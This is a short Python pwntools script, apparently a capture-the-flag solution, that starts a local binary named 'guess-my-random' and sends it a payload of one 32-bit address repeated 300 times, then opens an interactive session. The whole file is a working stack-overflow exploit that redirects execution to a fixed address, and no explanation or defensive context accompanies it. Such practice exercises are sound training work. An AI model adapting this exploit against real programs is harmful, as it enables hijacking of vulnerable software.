#!/usr/bin/env python
from pwn import *

p = process("./guess-my-random")
p.recv()
string = p32(0x0804863b)*300
p.sendline(string)
p.interactive()
